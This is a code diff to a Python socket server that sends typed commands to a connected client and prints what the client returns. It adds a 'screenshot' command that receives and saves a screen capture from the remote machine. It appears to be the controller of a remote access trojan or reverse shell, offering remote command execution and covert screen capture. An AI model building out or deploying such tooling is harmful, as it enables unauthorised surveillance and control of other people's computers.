@@ -13,6 +13,21 @@ def handle_connection(connection, address):
                 connection.send(b'quit')
                 break
             connection.send(command.encode())
+            if command.lower() == 'screenshot':
+                img_size = int(connection.recv(1024).decode())
+                connection.send(b'OK')
+                img_data = b''
+                while len(img_data) < img_size:
+                    packet = connection.recv(4096)
+                    if not packet:
+                        break
+                    img_data += packet
+
+                with open("screen.png", "wb") as f:
+                    f.write(img_data)
+                print("Capture reussie !")
+                continue
+
 
             response = connection.recv(4096).decode()
             print(f"Output:\n{response}")
